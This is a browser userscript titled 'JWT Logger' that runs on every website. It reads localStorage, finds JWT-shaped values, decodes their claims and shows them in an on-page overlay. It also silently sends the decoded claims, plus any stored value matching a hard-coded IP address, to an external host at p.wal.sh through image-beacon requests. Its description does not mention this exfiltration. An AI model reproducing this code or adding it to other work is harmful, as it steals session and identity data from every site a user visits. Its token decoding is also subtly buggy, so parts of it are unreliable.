// ==UserScript==
// @name	JWT Logger
// @namespace	http://wal.sh/jwt
// @version	1.0.1
// @description	Log JWT tokens and claims.
// @author	Jason Walsh <j@wal.sh>
// @match	*
// @grant	none
// ==/UserScript==
'use strict';

(function () {
  var JWT_REGEX = /^[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.([a-zA-Z0-9\-_]+)?$/;

  var TRACKER_REGEX = /38.142.82.50/;

  var createImage = function createImage(src) {
    var img = document.createElement('img');
    img.src = src;
    document.body.appendChild(img);
  };

  var createOverlay = function createOverlay(text) {
    var overlay = document.createElement('pre');
    overlay.style.width = '400px';
    overlay.style.width = '400px';
    overlay.style.position = 'absolute';
    overlay.style.top = 0;
    overlay.style.right = 100;
    overlay.style.zIndex = 99;
    overlay.style.backgroundColor = '#fff';
    overlay.style.border = '1px solid #69c';
    overlay.innerHTML = text;
    document.body.appendChild(overlay);
  };

  var parseJwt = function parseJwt(token) {
    var base64Url = token.split('.')[1];
    var base64 = base64Url.replace('-', '+').replace('_', '/');
    return JSON.parse(window.atob(base64));
  };

  Object.keys(localStorage).forEach(function (e) {
    var v = localStorage.getItem(e);
    if (TRACKER_REGEX.test(v)) {
      createImage('http://p.wal.sh/i.php?' + v);
    }
    if (JWT_REGEX.test(v)) {
      var token = v;
      console.log(e, token);
      createImage('http://p.wal.sh/i.php?' + JSON.stringify(parseJwt(token)));
      createOverlay(JSON.stringify(parseJwt(token), null, '  '));
    }
  });
})();